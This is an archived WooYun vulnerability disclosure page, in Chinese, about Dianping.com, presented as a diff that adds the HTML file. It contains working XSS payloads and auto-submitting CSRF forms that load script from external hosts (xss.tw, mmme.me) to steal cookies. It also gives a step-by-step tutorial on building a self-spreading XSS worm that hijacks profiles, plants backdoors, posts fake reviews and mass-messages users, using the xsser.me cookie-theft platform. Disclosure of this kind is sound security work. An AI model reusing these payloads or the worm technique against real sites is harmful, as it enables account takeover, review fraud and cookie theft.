@@ -1,0 +1,371 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		点评网主站漏洞打包详解+手把手教你写xss蠕虫  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		点评网主站漏洞打包详解+手把手教你写xss蠕虫  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/小胖胖要减肥">小胖胖要减肥</a> 
+</li><li>提交时间：		2013-01-23 09:22</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-01-23：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-01-23：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-02-02：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-02-12：	细节向普通白帽子公开<br/>
+									2013-02-22：	细节向实习白帽子公开<br/>
+									2013-03-09：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">如题，对点评主站的一些漏洞加以分析，给出各种漏洞的利用场景，最后再教大家如何写简单xss蠕虫</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">点评网站主要还是存在跨站问题，包括：存储，反射型xss，httponly没有设置，csrf无防御<br />
+<br />
+<br />
+<br />
+1 首先先来几个反射型xss，相对于一般的网站此类危害较小<br />
+<br />
+但由于点评对于跨站基本无防护，加上私信可以批量发送，反射型xss用谷歌短链转换下，危害还是很大的，包括盗取cookies，修改用户信息留后门，任意发表点评等，具体用法可参考之后的蠕虫脚本<br />
+<br />
+<br />
+<br />
+反射型，火狐直接使用</p><pre><code>&quot;/&gt;&lt;script&gt;alert(/1/)&lt;/script&gt;</code></pre><p class='detail'>就可以了<br />
+<br />
+ie8需要使用二哥的0day<br />
+<br />
+</p><pre><code>&quot;id=&gt;&lt;div/id=x&gt;x&lt;/div&gt;&lt;xml:namespace prefix=t&gt;&lt;import namespace=t implementation=%23default%23time2&gt;&lt;t:set/attributename=innerHTML targetElement=x to=%26lt;img%26%2311;src=x:x%26%2311;onerror%26%2311;=alert%26%23x28;document.cookie%26%23x29;%26gt;&gt;</code></pre><p class='detail'><br />
+<br />
+chrome则使用</p><pre><code>&quot;&gt;&lt;svg&gt;&lt;script xlink:href=//********&gt;&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+反射型还是很多的，工具都能扫到一堆，更不用说dom的了，随便举几个例子<br />
+<br />
+</p><p class="detail"><a href="../images/22215404e997509997cf10db4977716b6f74facc.jpg" target="_blank"><img src="../images/22215404e997509997cf10db4977716b6f74facc.jpg" alt="dp1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/222155190addd1fe6ae01b28447a323f24815182.jpg" target="_blank"><img src="../images/222155190addd1fe6ae01b28447a323f24815182.jpg" alt="dp2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2 至于怎么批量发送私信可以查看post接口<br />
+<br />
+</p><p class="detail"><a href="../images/22220118c2ebad755d331cadc03cfdec0061a7e7.jpg" target="_blank"><img src="../images/22220118c2ebad755d331cadc03cfdec0061a7e7.jpg" alt="dp3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+这里只要使用burp或自己写个脚本将targetName参数化，该值为用户名，可以批量获取后永久使用，然后通过该接口可以批量发送小广告，恶意链接等，比如“该美食店不错哦，请看连接”。<br />
+<br />
+<br />
+<br />
+3 说到私信了就不说说私信存在的一个csrf获取cookies的用法，表面上私信内容都是过滤的，但是对于输入的名字未过滤，但无法形成存储性xss，不过可以通过csrf构造post的反射型，弹框如图<br />
+<br />
+</p><p class="detail"><a href="../images/22220533c56bf9ddf02e30613b3ee9e771f9f439.jpg" target="_blank"><img src="../images/22220533c56bf9ddf02e30613b3ee9e771f9f439.jpg" alt="dp4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+具体csrf的脚本如下，自己放自己的shell网站上是不错的选择，比如美食的网站<br />
+<br />
+firefox和chrome的<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;form id=&quot;wrhoooo&quot; name=&quot;wrhoooo&quot; action=&quot;http://www.dianping.com/msg/send/6671203&quot; method=&quot;post&quot;&gt;<br />
+&lt;input type=&quot;test&quot; name=&quot;postBack&quot; value=&quot;true&quot; /&gt;<br />
+&lt;input type=&quot;test&quot; name=&quot;targetName&quot; value=&#039;&quot;&gt;&lt;svg&gt;&lt;script xlink:href=http://xss.tw/989&gt;&lt;/script&gt;&#039; /&gt;<br />
+&lt;input type=&quot;test&quot; name=&quot;content&quot; value=&#039;123&#039; /&gt;<br />
+&lt;/form&gt;<br />
+&lt;script&gt;<br />
+document.wrhoooo.submit();<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+ie8的<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;form id=&quot;wrhoooo&quot; name=&quot;wrhoooo&quot; action=&quot;http://www.dianping.com/msg/send/6671203&quot; method=&quot;post&quot;&gt;<br />
+&lt;input type=&quot;test&quot; name=&quot;postBack&quot; value=&quot;true&quot; /&gt;<br />
+&lt;input type=&quot;test&quot; name=&quot;targetName&quot; value=&#039;&quot;id=&gt;&lt;div/id=x&gt;x&lt;/div&gt;&lt;xml:namespace  prefix=t&gt;&lt;import namespace=t  implementation=#default#time2&gt;&lt;t:set/attributename=innerHTML targetElement=x  to=&amp;amp;lt;img&amp;amp;#11;src=x:x&amp;amp;#11;onerror=&amp;amp;#x0022;with&amp;amp;#x0028;document&amp;amp;#x0029;body.appendChild&amp;amp;#x0028;createElement&amp;amp;#x0028;&amp;amp;#x0027;script&amp;amp;#x0027;&amp;amp;#x0029;&amp;amp;#x0029;.src=&amp;amp;#x0027;http://xss.tw/989&amp;#x0027;&amp;amp;#x0022;&amp;amp;gt;&gt;&#039; /&gt;<br />
+&lt;input type=&quot;test&quot; name=&quot;content&quot; value=&#039;1&#039; /&gt;<br />
+&lt;/form&gt;<br />
+&lt;script&gt;<br />
+document.wrhoooo.submit();<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+4 既然说到了私信那么更要说说本身存在的csrf问题，包括私信，关注，鲜花，好评，更改用户资料等，url长度各浏览器有点区别，ie的最短为2000字节<br />
+<br />
+由于程序员在解析请求时没有区分post和get，导致所有请求包括发表点评都可以通过引用站外图片的方式来执行请求，或者直接一个连接，连接为<br />
+<br />
+</p><pre><code>http://www.dianping.com/ajax/json/shop/review?run=a&amp;s=4550707&amp;category=10&amp;cityid=1&amp;sa=Mo-Mo%E7%89%A7%E5%9C%BA&amp;s1=0&amp;s2=0&amp;s3=0&amp;ap=-1&amp;body=%E7%8E%AF%E5%A2%83%E4%B8%8D%E9%94%99%EF%BC%8C%E5%BA%97%E9%9D%A2%E4%B9%9F%E5%BE%88%E5%A4%A7%EF%BC%8C%E7%94%A8%E5%B1%8F%E9%A3%8E%E9%9A%94%E5%87%BA%E4%B8%80%E4%B8%AA%E4%B8%AA%E5%B0%8F%E9%97%B4%E3%80%82%0A%E6%88%90%E4%BA%BA%E6%AF%8F%E4%BD%8D138%E5%85%83%EF%BC%8C1%E7%B1%B33%E4%BB%A5%E4%B8%8B%E7%9A%84%E5%B0%8F%E6%9C%8B%E5%8F%8B%E5%8D%8A%E4%BB%B7%E3%80%82%E9%A4%90%E5%89%8D%E6%9C%89%E4%B8%80%E4%BB%BD%E5%B0%8F%E9%A3%9F%EF%BC%8C%E5%8C%85%E6%8B%AC%E4%B8%80%E5%9D%97%E9%B8%A1%E8%82%89%E5%92%8C%E4%B8%80%E4%B8%AA%E5%AF%BF%E5%8F%B8%EF%BC%8C%E8%BF%98%E6%9C%89%E6%B3%A1%E8%8F%9C%E3%80%82%0A%E7%82%B9%E4%BA%86%E5%AF%BF%E5%96%9C%E9%94%85%E3%80%81%E7%89%9B%E8%82%A9%E8%82%89%E3%80%81%E7%89%9B%E4%BA%94%E8%8A%B1%E8%82%89%E3%80%81%E4%BA%94%E8%8A%B1%E8%82%89%E3%80%81%E7%BE%8A%E8%82%89%E3%80%81%E9%AD%94%E8%8A%8B%E4%B8%9D%E7%AD%89%E3%80%82%E8%94%AC%E8%8F%9C%E3%80%81%E8%B1%86%E5%88%B6%E5%93%81%E7%B1%BB%E7%9A%84%E6%98%AF%E5%90%83%E5%88%B0%E4%B8%80%E5%8D%8A%E6%97%B6%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%91%98%E6%8E%A8%E4%B8%AA%E5%B0%8F%E8%BD%A6%E8%BF%9B%E6%9D%A5%E7%BB%99%E4%BD%A0%E5%8A%A0%E7%9A%84%E3%80%82%E8%82%89%E7%B1%BB%E7%9A%84%E9%83%BD%E9%9D%9E%E5%B8%B8%E5%AB%A9%EF%BC%8C%E5%BE%88%E5%A5%BD%E5%90%83%E3%80%82&amp;dtag=&amp;stag=&amp;park=&amp;ctitle=&amp;setag=false&amp;tap=true&amp;s4=1&amp;cat=false&amp;tuangou=false&amp;star=10&amp;m101=0&amp;keyList=m101&amp;sina_sync=2&amp;qzone_sync=2&amp;sohu_sync=2</code></pre><p class='detail'><br />
+<br />
+由于社区编辑器控件的关系对于站内地址是无过滤的，可以用来给商家刷点评，危害也不小啊，特别提一下还有办法让用户删不掉点评，待会蠕虫再说<br />
+<br />
+</p><p class="detail"><a href="../images/222214155903d5876388319198b245e727e6abb2.jpg" target="_blank"><img src="../images/222214155903d5876388319198b245e727e6abb2.jpg" alt="dp5.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+再看下有没有自动发点评<br />
+<br />
+</p><p class="detail"><a href="../images/22221523f8906168c3607c94ffbe70845b0c0305.jpg" target="_blank"><img src="../images/22221523f8906168c3607c94ffbe70845b0c0305.jpg" alt="dp6.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+相对于这个功能对于以点评为中心的应该算比较高危的了，刷其他的都是小事<br />
+<br />
+<br />
+<br />
+5 说好了反射的那就说说一些自己x自己的存储型的，举个例子，蠕虫也会提到<br />
+<br />
+这个地方过滤了&lt;script&gt;,但没有过滤&lt;frame&gt;,不知道开发是不是js比较差，应该和其他地方一样对于&#039; &quot; &lt;&gt;进行过滤<br />
+<br />
+</p><p class="detail"><a href="../images/22223023d997c3f609191e1ef173724665aaf00b.jpg" target="_blank"><img src="../images/22223023d997c3f609191e1ef173724665aaf00b.jpg" alt="dp7.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+6 最后再说说盲打这个问题，直接看图吧<br />
+<br />
+</p><p class="detail"><a href="../images/222252454c86ffba7e220a0b31cbb77a73f854aa.jpg" target="_blank"><img src="../images/222252454c86ffba7e220a0b31cbb77a73f854aa.jpg" alt="dp12.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">下面就要讲重点了蠕虫，蠕虫点为点评时的停车信息。首先大家要知道，就算防止了csrf，包括referer，token，由于是调用到站内的js，referer无效了，token一般都是可以通过js读取的，具体可参考新浪蠕虫的例子，由于点评没有token我也就没写这段代码了。<br />
+<br />
+<br />
+<br />
+先看看效果吧，由于不敢测试我把xss蠕虫先写成了csrf，代码如下，调用了sogili写的那个xss.js<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;head&gt;<br />
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot;&gt;<br />
+&lt;body&gt;<br />
+&lt;script src=&quot;http://mmme.me/xss.js&quot; &gt;<br />
+&lt;/script&gt;<br />
+&lt;script&gt;<br />
+xss.najax(&#039;http://www.dianping.com/msg/send/1472480?postBack=true&amp;targetName=%E5%AE%A2%E6%9C%8D%E7%B2%BE%E7%81%B5&amp;content=%E5%AE%A2%E6%9C%8D%E7%B2%BE%E7%81%B5%E6%88%91%E7%9A%84%E5%8F%B7%E8%A2%AB%E7%9B%97%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%<br />
+<br />
+9E&#039;)<br />
+&lt;/script&gt;<br />
+&lt;script&gt;<br />
+xss.najax(&#039;http://www.dianping.com/member/myinfo/setup/basic&#039;,{userNickName:&#039;tes&#039;+xss.rdm(),userSex:&#039;1&#039;,userCityName:&#039;1&#039;,userSign:&#039;&quot;&gt;&lt;script src=//xss.tw/989&gt;&lt;script&gt;&#039;,operation:&#039;update&#039;,currentUserSign:&#039;&#039;})<br />
+userNickName=xss.rdm();<br />
+&lt;/script&gt;<br />
+&lt;script&gt;<br />
+xss.najax(&#039;http://www.dianping.com/ajax/json/shop/review&#039;,{run:&#039;a&#039;,s:&#039;60&#039;+xss.rdm(),category:&#039;10&#039;,cityid:&#039;1&#039;,s1:&#039;4&#039;,s2:&#039;4&#039;,s3:&#039;4&#039;,ap:&#039;-1&#039;,body:&#039;This is just a test, just for fun, worm tester.This is just a test, just for fun, worm tester.This is just a test, just for fun, worm tester.This is just a test, just for fun, worm tester.This is just a <br />
+<br />
+test, just for fun, worm tester.This is just a test, just for fun, worm tester&#039;,park:&#039;&quot;&gt;&lt;script src=//xss.tw/989&gt;&lt;script&gt;&#039;,setag:&#039;false&#039;,tap:&#039;true&#039;,s4:&#039;1&#039;,cat:&#039;false&#039;,tuangou:&#039;false&#039;,star:&#039;30&#039;,m101:&#039;0&#039;,keylist:&#039;m101&#039;})<br />
+s=xss.rdm();<br />
+&lt;/script&gt;<br />
+&lt;script&gt;<br />
+alert(/你点评的名字被改了，账号被盗了，你信么，看看是不是还给别人发了私信，是不是还随机商家发了点评，还有自带蠕虫地址哦，是不是还能做其他的事情呢/)<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+1 看看效果先，之后讲讲怎么更好利用<br />
+<br />
+</p><p class="detail"><a href="../images/222236054ab7a8e255f849f373bed0df8b21c9da.jpg" target="_blank"><img src="../images/222236054ab7a8e255f849f373bed0df8b21c9da.jpg" alt="dp8.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+随机一个商户发表点评，可以从图中看到没有删除按钮，</p><pre><code>&quot;&gt;&lt;script src=//xss.tw/989&gt;&lt;script&gt;</code></pre><p class='detail'>的关系，里面的地址就是蠕虫的js，那么随机评价好不好呢，当然不是最佳的，最好的其实是写个100个最火商家的集合再加几组数字来进行随机，那么效果肯定非常好。<br />
+<br />
+那么点评内容呢，当然也要多些几组来随机，如果恶意的话评分都是1好了，还有那个蠕虫点停车信息，可以弄个一次为空，一次不为空随机，不要蠕的太厉害了。<br />
+<br />
+<br />
+<br />
+2 第二个请求是什么呢，看图吧<br />
+<br />
+</p><p class="detail"><a href="../images/22224051877572df8666434fabf0f25a34c200ac.jpg" target="_blank"><img src="../images/22224051877572df8666434fabf0f25a34c200ac.jpg" alt="dp9.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+原来我的名字被改了，规则为&#039;tes&#039;+xss.rdm()，唉果然被盗号了啊，看看在自我介绍还留了后门，编辑资料就触发，其实常居地也是。可以看看被改的一个账号的<br />
+<br />
+</p><p class="detail"><a href="../images/22224605ba6ad6496c53bcbc80a0d9aed3d1a674.jpg" target="_blank"><img src="../images/22224605ba6ad6496c53bcbc80a0d9aed3d1a674.jpg" alt="dp10.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+我登上去的时候名字已经改回来了<br />
+<br />
+<br />
+<br />
+3 最后看看是不是给某某发了私信<br />
+<br />
+</p><p class="detail"><a href="../images/22225346cd71cf10e74f05a5ae3c8eaaccf4e6fc.jpg" target="_blank"><img src="../images/22225346cd71cf10e74f05a5ae3c8eaaccf4e6fc.jpg" alt="dp13.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+既然效果都达到了<br />
+<br />
+<br />
+<br />
+现在知道蠕虫点位停车信息，这个蠕虫点很好，发表点评即可显示在每个商户的点评页，高分的人还能直接显示在默认点评<br />
+<br />
+那么首先蠕虫是怎么写的呢，首先我们要知道请求一般都是通过form表单或者ajax格式发送的，我们写js的时候只要模拟用户提交就可以了。<br />
+<br />
+因为xss可以调用站外脚本，我们只要把请求写在我们自己的js里，如果有token，只要想办法调用下token就可以了。<br />
+<br />
+<br />
+<br />
+1 那么我们可以先打开http://xsser.me，创建一个项目，勾选默认和xss.js，默认因为我们要获取cookies。<br />
+<br />
+<br />
+<br />
+2 在自定义代码中加入刚才的三个请求，直接复制粘贴就可以了，如图<br />
+<br />
+</p><p class="detail"><a href="../images/2223005020a788d34fc8b261c5b6c1a8cb6f9c71.jpg" target="_blank"><img src="../images/2223005020a788d34fc8b261c5b6c1a8cb6f9c71.jpg" alt="dp14.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+由于我刚才使用csrf测试的，所以用了x.najax这个伪ajax方法，csrf直接用ajax试过不行，估计限制了跨域请求，这个每个网站设置不同。x.najax的好处是站内站外都能用，可以好好看看http://mmme.me/xss.js就明白了<br />
+<br />
+<br />
+<br />
+3 之后点击下一步可以看到详细代码，我就不贴了，调用js地址就是http://xsser.me/zJ5sSA?1358******，由于上面我没有直接使用蠕虫地址在脚本的那个停车信息，我们也可以测试下，是否成功写好蠕虫代码了。<br />
+<br />
+<br />
+<br />
+4 js调用成功<br />
+<br />
+</p><p class="detail"><a href="../images/22230844524036db03f473abd7ba71bd2dd2f994.jpg" target="_blank"><img src="../images/22230844524036db03f473abd7ba71bd2dd2f994.jpg" alt="dp15.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+5 看看是否执行请求<br />
+<br />
+</p><p class="detail"><a href="../images/222316076d9d656d33e70fa0b491ca47f842352b.jpg" target="_blank"><img src="../images/222316076d9d656d33e70fa0b491ca47f842352b.jpg" alt="dp16.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+可以看到效果多点了几下，发现可以蠕虫了，个人信息页被改了，蠕虫的用法就介绍到这里吧，例子很简单。对于厂商有个自动屏蔽点评功能不错，但如果一些点评没有带蠕虫的恶意点评不会自动屏蔽，有时候也不是所有带恶意点评的蠕虫都会屏蔽。<br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">觉得严重的一一修复吧 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/小胖胖要减肥" title="小胖胖要减肥">小胖胖要减肥</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-017701" title="点评网主站漏洞打包详解+手把手教你写xss蠕虫">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：8 </p>
+													<p class="detail">确认时间：2013-01-23 15:20</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢小胖胖要减肥，部分漏洞是已知正在修复中。根据提供的信息，除了一个个Fix，还在考虑系统级别的防护工具。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="17701";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
